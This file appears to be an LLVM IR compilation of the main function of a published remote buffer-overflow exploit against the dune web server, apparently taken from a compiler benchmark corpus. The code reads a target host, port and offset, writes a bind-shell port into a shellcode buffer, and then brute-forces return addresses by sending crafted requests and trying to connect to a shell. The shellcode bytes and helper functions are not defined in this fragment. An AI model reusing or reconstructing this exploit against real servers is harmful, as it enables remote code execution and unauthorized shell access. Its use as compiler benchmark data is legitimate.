; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22786.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22786.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [106 x i8] c"[*] dune[0.6.7+-]: remote buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"[!] syntax: %s <hostname> [port] [offset] [shell port]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [66 x i8] c"[!] shell port defined contains bad character(s), using default.\0A\00", align 1
@x86_exec = common dso_local global i16* null, align 8
@.str.3 = private unnamed_addr constant [46 x i8] c" target:%s:%d addresses:0x%.8x(+%ld)-0x%.8x\0A\0A\00", align 1
@BASE_ADDR = common dso_local global i32 0, align 4
@END_ADDR = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"[. = 350 byte offset]: \00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"(hit memory limit, aborting)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i16, align 2
  %8 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 80, i16* %6, align 2
  store i16 7979, i16* %7, align 2
  store i64 0, i64* %8, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 2
  br i1 %11, label %12, label %18

12:                                               ; preds = %2
  %13 = load i8**, i8*** %5, align 8
  %14 = getelementptr inbounds i8*, i8** %13, i64 0
  %15 = load i8*, i8** %14, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0), i8* %15)
  %17 = call i32 @exit(i32 1) #3
  unreachable

18:                                               ; preds = %2
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 2
  br i1 %20, label %21, label %27

21:                                               ; preds = %18
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @atoi(i8* %24)
  %26 = ptrtoint i8* %25 to i16
  store i16 %26, i16* %6, align 2
  br label %27

27:                                               ; preds = %21, %18
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %28, 3
  br i1 %29, label %30, label %36

30:                                               ; preds = %27
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 3
  %33 = load i8*, i8** %32, align 8
  %34 = call i8* @atoi(i8* %33)
  %35 = ptrtoint i8* %34 to i64
  store i64 %35, i64* %8, align 8
  br label %36

36:                                               ; preds = %30, %27
  %37 = load i32, i32* %4, align 4
  %38 = icmp sgt i32 %37, 4
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 4
  %42 = load i8*, i8** %41, align 8
  %43 = call i8* @atoi(i8* %42)
  %44 = ptrtoint i8* %43 to i16
  store i16 %44, i16* %7, align 2
  br label %45

45:                                               ; preds = %39, %36
  %46 = load i16, i16* %7, align 2
  %47 = zext i16 %46 to i32
  %48 = and i32 %47, 65280
  %49 = ashr i32 %48, 8
  %50 = icmp eq i32 %49, 255
  br i1 %50, label %67, label %51

51:                                               ; preds = %45
  %52 = load i16, i16* %7, align 2
  %53 = zext i16 %52 to i32
  %54 = and i32 %53, 255
  %55 = icmp eq i32 %54, 255
  br i1 %55, label %67, label %56

56:                                               ; preds = %51
  %57 = load i16, i16* %7, align 2
  %58 = zext i16 %57 to i32
  %59 = and i32 %58, 65280
  %60 = ashr i32 %59, 8
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %67

62:                                               ; preds = %56
  %63 = load i16, i16* %7, align 2
  %64 = zext i16 %63 to i32
  %65 = and i32 %64, 255
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %69, label %67

67:                                               ; preds = %62, %56, %51, %45
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.2, i64 0, i64 0))
  store i16 7979, i16* %7, align 2
  br label %69

69:                                               ; preds = %67, %62
  %70 = load i16, i16* %7, align 2
  %71 = zext i16 %70 to i32
  %72 = and i32 %71, 65280
  %73 = ashr i32 %72, 8
  %74 = trunc i32 %73 to i16
  %75 = load i16*, i16** @x86_exec, align 8
  %76 = getelementptr inbounds i16, i16* %75, i64 20
  store i16 %74, i16* %76, align 2
  %77 = load i16, i16* %7, align 2
  %78 = zext i16 %77 to i32
  %79 = and i32 %78, 255
  %80 = trunc i32 %79 to i16
  %81 = load i16*, i16** @x86_exec, align 8
  %82 = getelementptr inbounds i16, i16* %81, i64 21
  store i16 %80, i16* %82, align 2
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 1
  %85 = load i8*, i8** %84, align 8
  %86 = load i16, i16* %6, align 2
  %87 = zext i16 %86 to i32
  %88 = load i32, i32* @BASE_ADDR, align 4
  %89 = load i64, i64* %8, align 8
  %90 = load i32, i32* @END_ADDR, align 4
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0), i8* %85, i32 %87, i32 %88, i64 %89, i32 %90)
  %92 = load i32, i32* @stderr, align 4
  %93 = call i32 @fprintf(i32 %92, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  br label %94

94:                                               ; preds = %122, %69
  %95 = load i32, i32* @BASE_ADDR, align 4
  %96 = sext i32 %95 to i64
  %97 = load i64, i64* %8, align 8
  %98 = add i64 %96, %97
  %99 = load i32, i32* @END_ADDR, align 4
  %100 = sext i32 %99 to i64
  %101 = icmp ult i64 %98, %100
  br i1 %101, label %102, label %142

102:                                              ; preds = %94
  %103 = load i32, i32* @BASE_ADDR, align 4
  %104 = sext i32 %103 to i64
  %105 = load i64, i64* %8, align 8
  %106 = and i64 %105, 255
  %107 = add i64 %104, %106
  %108 = icmp ne i64 %107, 0
  br i1 %108, label %112, label %109

109:                                              ; preds = %102
  %110 = load i64, i64* %8, align 8
  %111 = add i64 %110, -1
  store i64 %111, i64* %8, align 8
  br label %112

112:                                              ; preds = %109, %102
  %113 = load i32, i32* @BASE_ADDR, align 4
  %114 = sext i32 %113 to i64
  %115 = load i64, i64* %8, align 8
  %116 = and i64 %115, 255
  %117 = add i64 %114, %116
  %118 = icmp eq i64 %117, 255
  br i1 %118, label %119, label %122

119:                                              ; preds = %112
  %120 = load i64, i64* %8, align 8
  %121 = add i64 %120, -1
  store i64 %121, i64* %8, align 8
  br label %122

122:                                              ; preds = %119, %112
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  %126 = load i16, i16* %6, align 2
  %127 = load i32, i32* @BASE_ADDR, align 4
  %128 = sext i32 %127 to i64
  %129 = load i64, i64* %8, align 8
  %130 = add i64 %128, %129
  %131 = trunc i64 %130 to i32
  %132 = call i32 @request_url(i8* %125, i16 zeroext %126, i32 %131)
  %133 = call i32 @sleep(i32 1)
  %134 = load i8**, i8*** %5, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = load i16, i16* %7, align 2
  %138 = load i64, i64* %8, align 8
  %139 = call i32 @getshell(i8* %136, i16 zeroext %137, i64 %138)
  %140 = load i64, i64* %8, align 8
  %141 = add i64 %140, 350
  store i64 %141, i64* %8, align 8
  br label %94

142:                                              ; preds = %94
  %143 = load i32, i32* @stderr, align 4
  %144 = call i32 @fprintf(i32 %143, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %145 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @request_url(i8*, i16 zeroext, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getshell(i8*, i16 zeroext, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
